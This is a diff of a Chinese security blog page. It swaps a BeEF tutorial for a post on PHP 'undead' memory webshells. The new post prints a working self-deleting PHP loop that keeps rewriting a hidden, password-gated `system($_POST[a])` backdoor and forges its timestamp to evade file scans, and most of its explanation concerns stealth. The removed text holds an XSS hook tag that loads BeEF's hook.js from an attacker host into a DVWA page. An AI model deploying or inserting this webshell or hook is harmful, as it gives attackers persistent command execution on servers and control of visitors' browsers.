@@ -11,7 +11,7 @@
     <!--Description-->
     
         <meta name="description" content="@TOC
-beef概念一、BeEF，全称The Browser Exploitation Framework，是一款针对浏览器的渗透测试工具。 用Ruby语言开发的，Kali中默认安装的一个模块，用于实现对XSS漏洞的攻击和利用。BeEF主要是往网页中插入一段名为hook.js的JS脚本代码，如果浏">
+基本概念内存性木马即不死马，一般会删除自身以进程的形式循环创建隐蔽的后门。内存马是无文件攻击的一种技术手段,那我们不得不先简单介绍一下无文件攻击。无文件攻击可以有效地躲避传统安全软件的检测,它们可以在系统的内存中远程加载执行、驻留在注册表中或滥用常用的白名单工具,例如PowerShell,">
     
 
     <!--Author-->
@@ -21,7 +21,7 @@ beef概念一、BeEF，全称The Browser Exploitation Framework，是一款针�
 
     <!--Open Graph Title-->
     
-        <meta property="og:title" content="beef"/>
+        <meta property="og:title" content="PHP不死马"/>
     
 
     <!--Open Graph Description-->
@@ -46,7 +46,7 @@ beef概念一、BeEF，全称The Browser Exploitation Framework，是一款针�
 
     <!-- Title -->
     
-    <title>beef - Hexo</title>
+    <title>PHP不死马 - Hexo</title>
 
     <!-- Bootstrap Core CSS -->
     <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.2/css/bootstrap.min.css" integrity="sha384-y3tfxAZXuh4HwSYylfB+J125MxIs6mR5FOHamPBG064zB+AFeWH94NdvaCBm8qnd" crossorigin="anonymous">
@@ -152,13 +152,13 @@ beef概念一、BeEF，全称The Browser Exploitation Framework，是一款针�
 
     <div class="post-header">
         <h1 class="title">
-            <a href="/2021/07/25/beef/">
-                beef
+            <a href="/2021/08/08/PHP%E4%B8%8D%E6%AD%BB%E9%A9%AC/">
+                PHP不死马
             </a>
         </h1>
         <div class="post-info">
             
-                <span class="date">2021-07-25</span>
+                <span class="date">2021-08-08</span>
             
             
             
@@ -171,18 +171,16 @@ beef概念一、BeEF，全称The Browser Exploitation Framework，是一款针�
         
 
         <!-- Post Content -->
-        <p>@<a href="beef">TOC</a></p>
-<h2 id="beef概念"><a href="#beef概念" class="headerlink" title="beef概念"></a>beef概念</h2><p>一、BeEF，全称The Browser Exploitation Framework，是一款针对浏览器的渗透测试工具。 用Ruby语言开发的，Kali中默认安装的一个模块，用于实现对XSS漏洞的攻击和利用。<br>BeEF主要是往网页中插入一段名为hook.js的JS脚本代码，如果浏览器访问了有hook.js(钩子)的页面，就会被hook(勾住)，勾连的浏览器会执行初始代码返回一些信息，接着目标主机会每隔一段时间（默认为1秒）就会向BeEF服务器发送一个请求，询问是否有新的代码需要执行。BeEF服务器本质上就像一个Web应用，被分为前端和后端。前端会轮询后端是否有新的数据需要更新，同时前端也可以向后端发送指示， BeEF持有者可以通过浏览器来登录 BeEF 的后端，来控制前端(用户的浏览器)。BeEF一般和XSS漏洞结合使用。</p>
-<h2 id="beef的安装"><a href="#beef的安装" class="headerlink" title="beef的安装"></a>beef的安装</h2><p>对于Windows下安装比较费力，所以直接在kali中安装。<br>1、输入命令</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install beef-xss</span><br></pre></td></tr></table></figure>
-<p>即可开始安装<br>2.安装结束后可以查看打开</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo beef-xss</span><br></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/5fdfd5ae5824401fa985ee42868737e9.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/b39b7e90f63c452eb0f4564972d3c0d8.png" alt="在这里插入图片描述"><br>这就是上文提到的hook，是beef中非常重要的东西。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hook:&lt;script src=&quot;http://&lt;IP&gt;:3000/hook.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-<h2 id="beef的使用"><a href="#beef的使用" class="headerlink" title="beef的使用"></a>beef的使用</h2><p>下面让我们进行一些操作。我们知道beef监听的是端口号为：3000。<br>我们可以打开kali当中的文件系统</p>
-<p><img src="https://img-blog.csdnimg.cn/eca4cf655793410e89bb3acdc5b7587c.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>打开config.yaml，在这个里面我们可以修改他所绑定的ip地址成自己的ip<br><img src="https://img-blog.csdnimg.cn/ba6e12f0088c43398dfb1ad9785cc9ae.png" alt="在这里插入图片描述"><br>即host。</p>
-<h2 id="beef的实战"><a href="#beef的实战" class="headerlink" title="beef的实战"></a>beef的实战</h2><p>最后让我们进行beef的实战吧！<br><img src="https://img-blog.csdnimg.cn/f7fd8a8d3bc8433eb706f266b01c7df1.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>在kali下使用phpstudy打开dvwa靶场，选择low级别的<br><img src="https://img-blog.csdnimg.cn/30ba1985e7bd4281ac9e126d1512a197.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>因为beef一般针对xss漏洞，所以选择这道题，Name是test，而Message是上面的Hook<br><img src="https://img-blog.csdnimg.cn/3de473d28e0d4f13958648011e218f1d.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>会出现这种情况，是因为文本框被限制了，我们只需要右击，然后检查元素<br><img src="https://img-blog.csdnimg.cn/ebf924a1fb89404d9b309ed2c06879ae.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>修改最大长度，再输入Hook的内容。<br>打开网址<a target="_blank" rel="noopener" href="http://127.0.0.1:3000/ui/panel%EF%BC%8C%E7%84%B6%E5%90%8E%E8%BE%93%E5%85%A5%E5%88%9A%E6%89%8D%E7%9A%84%E5%AF%86%E7%A0%81">http://127.0.0.1:3000/ui/panel，然后输入刚才的密码</a><br><img src="https://img-blog.csdnimg.cn/cb41572a97e0401aa6c5a9e4928b0e0f.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>绿色对目标主机生效并且不可见(不会被发现)<br>橙色对目标主机生效但可能可见(可能被发现)<br>灰色对目标主机来必生效(可验证下)<br>红色对目标主机不生效</p>
-<p>下面我们进行一个测试<br><img src="https://img-blog.csdnimg.cn/e3037b56194a4b7c806ab787d43be145.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>点击，然后点击Excute，弹窗出现<br><img src="https://img-blog.csdnimg.cn/ae5718d81be94d4ca217d257ce3bbfd3.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+        <p>@<a href="%E8%BF%99%E9%87%8C%E5%86%99%E7%9B%AE%E5%BD%95%E6%A0%87%E9%A2%98">TOC</a></p>
+<h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><p>内存性木马即不死马，一般会删除自身以进程的形式循环创建隐蔽的后门。内存马是无文件攻击的一种技术手段,那我们不得不先简单介绍一下无文件攻击。无文件攻击可以有效地躲避传统安全软件的检测,它们可以在系统的内存中远程加载执行、驻留在注册表中或滥用常用的白名单工具,例如PowerShell,Windows Management Instrumentation(WMI)和PsExec等。无文件攻击技术允许攻击者访问系统,从而启用后续的恶意活动。通过操纵漏洞利用程序、合法工具、宏和脚本,攻击者可以破坏系统、提升特权或在网络上横向传播恶意代码。而且,无文件威胁在执行后不会留下任何痕迹,这使其难以被检测和清除。<br><img src="https://img-blog.csdnimg.cn/7f789ac0abca4ed5bc04ee0452748ca5.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">在这里我们只介绍PHP内存马。<br>PHP内存马利用脚本解析执行特性，调用PHP运行时文件访问接口动态加载恶意代码，之后调用PHP运行时外部命令执行接口执行恶意代码。</p>
+<h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><p><img src="https://img-blog.csdnimg.cn/4be572e47cd440a7b25b06afacef60c1.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>① 当PHP-FPM启用时，通过Fastcgi协议（Fastcgi协议是服务器中间件和后端进行数据交换的协议）向PHP-FPM发起请求执行任意文件。如果PHP-FPM可被外部访问，攻击者通过Fastcgi协议可直接请求PHP-FPM执行”任意文件”。<br><img src="https://img-blog.csdnimg.cn/b9f8ef2c5f2143ba9b955fc3f39b2936.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">② 内存驻留Webshell通常会在php执行起来后，删除php文件本体。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	ignore_user_abort(<span class="literal">true</span>);</span><br><span class="line">	set_time_limit(<span class="number">0</span>);</span><br><span class="line">	unlink(__FILE__);</span><br><span class="line">	$file = <span class="string">&#x27;/var/www/dvwa/.ski12.php&#x27;</span>;</span><br><span class="line">	$code = <span class="string">&#x27;&lt;?php if(md5($_POST[&quot;pass&quot;])==&quot;cdd7b7420654eb16c1e1b748d5b7c5b8&quot;)&#123;@system($_POST[a]);&#125;?&gt;&#x27;</span>;</span><br><span class="line">	<span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">		file_put_contents($file, $code);</span><br><span class="line">		system(<span class="string">&#x27;touch -m -d &quot;2018-12-01 09:10:12&quot; .ski12.php&#x27;</span>);</span><br><span class="line">		usleep(<span class="number">5000</span>);</span><br><span class="line">	&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>ignore_user_abort()函数设置与客户机断开是否会终止脚本的执行。这里设置为true则忽略与用户的断开，即使与客户机断开脚本仍会执行。</p>
+<p>set_time_limit()函数设置脚本最大执行时间。这里设置为0，即没有时间方面的限制。</p>
+<p>unlink(<strong>FILE</strong>)删除文件本身，以起到隐蔽自身的作用。</p>
+<p>while循环内每隔usleep(5000)即写新的后门文件，中间system()执行的命令用于修改文件的创建或修改时间，可以绕过“find –name &#39;*.php&#39; –mmin -10”命令检测最近10分钟修改或新创建的PHP文件，但不一定有用，可选。</p>
+<p>至于最后生成的隐蔽后门在需要校验一个POST参数的MD5值，原因在于防止其他人可以进行利用。</p>
+<h2 id="防护原理"><a href="#防护原理" class="headerlink" title="防护原理"></a>防护原理</h2><p>通过对PHP执行进程进行监控，关联分析敏感行为以识别此类攻击</p>
 
     </div>
 
